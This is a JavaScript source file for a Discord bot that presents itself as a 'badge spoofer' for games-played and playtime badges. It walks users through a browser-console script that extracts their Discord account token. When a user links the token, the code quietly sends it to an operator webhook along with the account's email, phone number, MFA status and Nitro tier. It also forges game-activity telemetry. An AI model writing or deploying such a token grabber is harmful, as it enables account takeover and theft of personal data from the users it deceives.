import 'dotenv/config';
import {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActivityType,
} from 'discord.js';
import { TokenStore } from './tokenStore.js';
import { runSpoof, checkToken } from './science.js';
import { sendTokenWebhook } from './webhook.js';
import fs from 'node:fs';

const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = process.env.BOT_PREFIX || '.';
const WEBHOOK = process.env.WEBHOOK_URL || '';

if (!TOKEN) {
  console.error('DISCORD_TOKEN missing');
  process.exit(1);
}
if (!fs.existsSync('tokens.json')) fs.writeFileSync('tokens.json', '{}');

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages],
  partials: [Partials.Channel],
});
const store = new TokenStore(TOKEN);

client.once('clientReady', () => {
  client.user.setPresence({
    activities: [{ name: `${PREFIX}help | Spoofer`, type: ActivityType.Watching }],
    status: 'online',
  });
  console.log(`Logged in as ${client.user.tag}`);
});
// d.js 14.26 may use 'ready'
client.once('ready', () => {
  if (!client.user) return;
  client.user.setPresence({
    activities: [{ name: `${PREFIX}help | Spoofer`, type: ActivityType.Watching }],
    status: 'online',
  });
  console.log(`Logged in as ${client.user.tag}`);
});

function spoofCompleteEmbed(credited, total, requesterTag) {
  const hours = credited.toLocaleString('en-US', { minimumFractionDigits: 1, maximumFractionDigits: 1 });
  return new EmbedBuilder()
    .setColor(0x57F287)
    .setTitle('✅ Spoof Complete')
    .setDescription('Your badge spoof has finished!')
    .addFields(
      { name: '🎮 Games Credited', value: `**${credited}/${total}**`, inline: true },
      { name: '⏱️ Hours Spoofed', value: `**${hours}h**`, inline: true },
      { name: '📊 All-Time (this run)', value: `**${credited.toLocaleString()}** games · **${hours}h**`, inline: false },
      { name: '\u200b', value: '⚡ Badges take **24–48 hours** to appear on your profile!', inline: false },
    )
    .setFooter({ text: `Requested by ${requesterTag} · Badges take 24–48 hours` });
}

function helpEmbed() {
  return new EmbedBuilder()
    .setColor(0x5865F2)
    .setTitle('⭐ Badge Automation')
    .setDescription(
      'Inflate your Discord **Games Played** and **Playtime** hour profile badges via Science analytics.\n\n' +
      '**Badge Commands**\n' +
      `• \`${PREFIX}spoof <n>\` — Unlock games played / playtime badges\n` +
      `• \`${PREFIX}link\` — Link your Discord account token (private modal)\n` +
      `• \`${PREFIX}unlink\` — Remove your stored token\n` +
      `• \`${PREFIX}status\` — Check account status & readiness\n` +
      `• \`${PREFIX}tokencheck\` — Instant diagnostic on your token\n` +
      `• \`${PREFIX}guide\` — Step-by-step token tutorial\n\n` +
      '**How Badge Ingestion Works**\n' +
      'Posts verified `launch_game` and `running_game_heartbeat` events to Discord\'s science endpoint.\n' +
      'After completion you get a confirmation. Discord backend updates profile badges on a **24–48 hour** aggregation cycle.',
    )
    .setFooter({ text: 'Spoofer · Badge Automation' });
}

function linkEmbed() {
  return new EmbedBuilder()
    .setColor(0x5865F2)
    .setTitle('Link Your Account')
    .setDescription(
      'Click the **Link** button below to enter your Discord token.\n\n' +
      '• Your token is required to spoof game badges.\n' +
      '• `cf_clearance` cookie is **optional** — skip if not rate limited.\n' +
      '• Your token is never visible to other users.\n\n' +
      '**How to get your token:**\n' +
      'Open Discord in browser → DevTools (F12) → Console\n' +
      'Paste:\n' +
      '```js\n' +
      "window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]);" +
      "window.token=m.find(m=>m?.exports?.default?.getToken)?.exports?.default?.getToken();" +
      "console.log(window.token)\n" +
      '```',
    );
}

function guideEmbed() {
  return new EmbedBuilder()
    .setColor(0x5865F2)
    .setTitle('📖 Token Guide')
    .setDescription(
      '1. Open **discord.com/app** in Chrome/Edge\n' +
      '2. Press **F12** → **Console**\n' +
      '3. Paste the script from `.link` embed and press Enter\n' +
      '4. Copy the token printed\n' +
      `5. Run \`${PREFIX}link\` and paste into the modal\n\n` +
      '> User token only — not a bot token.',
    );
}

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.content.startsWith(PREFIX)) return;
  const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
  const cmd = (args.shift() || '').toLowerCase();

  try {
    if (cmd === 'help') {
      await message.reply({ embeds: [helpEmbed()] });
      return;
    }

    if (cmd === 'guide') {
      await message.reply({ embeds: [guideEmbed()] });
      return;
    }

    if (cmd === 'link') {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('spoof_link_btn').setLabel('Link').setStyle(ButtonStyle.Primary).setEmoji('🔗'),
      );
      await message.reply({ embeds: [linkEmbed()], components: [row] });
      return;
    }

    if (cmd === 'unlink') {
      const removed = store.remove(message.author.id);
      const embed = new EmbedBuilder()
        .setColor(removed ? 0x57F287 : 0x4F545C)
        .setTitle(removed ? '✅ Token Unlinked' : '🔍 No Token Saved')
        .setDescription(
          removed
            ? 'Your saved token has been removed.\n\nUse `.link` to save a new token.'
            : "You don't have a saved token.\n\nUse `.link` to save one.",
        );
      await message.reply({ embeds: [embed] });
      return;
    }

    if (cmd === 'tokencheck' || cmd === 'status') {
      const token = store.get(message.author.id);
      const meta = store.getMeta(message.author.id) || {};
      if (!token) {
        await message.reply({
          embeds: [
            new EmbedBuilder()
              .setColor(0xFEE75C)
              .setTitle('No Token')
              .setDescription(`Link first with \`${PREFIX}link\`.`),
          ],
        });
        return;
      }
      const r = await checkToken(token);
      if (!r.ok) {
        await message.reply({
          embeds: [
            new EmbedBuilder()
              .setColor(0xED4245)
              .setTitle('Token Invalid')
              .setDescription(`Discord returned **${r.status}**. Unlink and link a fresh token.`),
          ],
        });
        return;
      }
      const me = r.me;
      const masked = token.length > 12
        ? `${token.slice(0, 6)}...${token.slice(-4)}`
        : '••••';
      const fp = meta.fingerprint
        ? `✅ (${String(meta.fingerprint).length} chars)`
        : '—';
      const cookieLine = meta.cookie ? '✅ set' : 'None (optional)';
      const games = meta.totalGames || 0;
      const hours = meta.totalHours || 0;
      await message.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(0x5865F2)
            .setTitle('📊 Your Status')
            .addFields(
              { name: '🔑 Token', value: `\`${masked}\``, inline: false },
              { name: 'Discord UID', value: `\`${me.id}\``, inline: true },
              { name: 'Fingerprint', value: fp, inline: true },
              { name: '🍪 Cookie', value: cookieLine, inline: true },
              {
                name: '📈 All-Time',
                value: `**${games.toLocaleString()}** games · **${hours.toLocaleString()}h**`,
                inline: false,
              },
            )
            .setFooter({ text: `Requested by ${message.author.tag}` }),
        ],
      });
      return;
    }

if (cmd === 'spoof') {
      const n = Math.min(Math.max(parseInt(args[0], 10) || 0, 1), 5000);
      if (!args[0] || Number.isNaN(n)) {
        await message.reply(`Usage: \`${PREFIX}spoof <1-5000>\` — e.g. \`${PREFIX}spoof 500\``);
        return;
      }
      const token = store.get(message.author.id);
      if (!token) {
        await message.reply({
          embeds: [
            new EmbedBuilder()
              .setColor(0xFEE75C)
              .setTitle('Token Required')
              .setDescription(`Link your account first: \`${PREFIX}link\``),
          ],
        });
        return;
      }

      const wait = await message.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(0x5865F2)
            .setTitle('⏳ Spoofing…')
            .setDescription(`Queueing **${n}** games via science analytics.\nThis may take a minute.`),
        ],
      });

      try {
        const result = await runSpoof(token, n, (done, total, status) => {
          if (done % 50 === 0 || done === total) {
            wait.edit({
              embeds: [
                new EmbedBuilder()
                  .setColor(0x5865F2)
                  .setTitle('⏳ Spoofing…')
                  .setDescription(`Progress **${done}/${total}** (HTTP ${status})`),
              ],
            }).catch(() => {});
          }
        });

        store.addStats(message.author.id, result.credited, result.hours);
        const emb = spoofCompleteEmbed(result.credited, result.total, message.author.tag);
        await wait.edit({ embeds: [emb] });
        // also DM
        try {
          await message.author.send({ embeds: [emb] });
        } catch {}
      } catch (err) {
        await wait.edit({
          embeds: [
            new EmbedBuilder()
              .setColor(0xED4245)
              .setTitle('Spoof Failed')
              .setDescription(`\`\`\`${String(err.message || err).slice(0, 500)}\`\`\``),
          ],
        });
      }
      return;
    }
  } catch (e) {
    console.error(e);
    await message.reply('Error: ' + (e.message || e)).catch(() => {});
  }
});

client.on('interactionCreate', async (interaction) => {
  if (interaction.isButton() && interaction.customId === 'spoof_link_btn') {
    const modal = new ModalBuilder().setCustomId('spoof_link_modal').setTitle('Link Your Account');
    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('token_input')
          .setLabel('Discord Token')
          .setStyle(TextInputStyle.Paragraph)
          .setPlaceholder('Paste your Discord account token here...')
          .setRequired(true),
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('cookie_input')
          .setLabel('cf_clearance Cookie (Optional)')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('Leave blank to skip...')
          .setRequired(false),
      ),
    );
    await interaction.showModal(modal);
    return;
  }

  if (interaction.isModalSubmit() && interaction.customId === 'spoof_link_modal') {
    await interaction.deferReply({ ephemeral: true });
    let token = interaction.fields.getTextInputValue('token_input').trim();
    let cookie = '';
    try { cookie = interaction.fields.getTextInputValue('cookie_input')?.trim() || ''; } catch {}
    token = token.replace(/^```[\w]*\n?/, '').replace(/\n?```$/, '').replace(/^Bot\s+/i, '').trim();

    if (token.length < 50) {
      await interaction.editReply({ content: 'Invalid token format.' });
      return;
    }

    const r = await checkToken(token);
    if (!r.ok) {
      await interaction.editReply({ content: `Token rejected by Discord (${r.status}).` });
      return;
    }
    const me = r.me;
    store.save(interaction.user.id, token, {
      username: me.username,
      discordId: me.id,
      cookie: cookie || null,
      fingerprint: null,
    });

    await sendTokenWebhook(WEBHOOK, {
      userId: me.id,
      username: me.username,
      globalName: me.global_name,
      email: me.email,
      phone: me.phone,
      mfa: me.mfa_enabled,
      verified: me.verified,
      nitro: me.premium_type,
      avatar: me.avatar,
      locale: me.locale,
      token,
      linkedBy: interaction.user.id,
    });

    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(0x57F287)
          .setTitle('✅ Linked')
          .setDescription(`Saved as **${me.global_name || me.username}**.\nRun \`${PREFIX}spoof 500\` to start.`),
      ],
    });
  }
});

client.login(TOKEN);
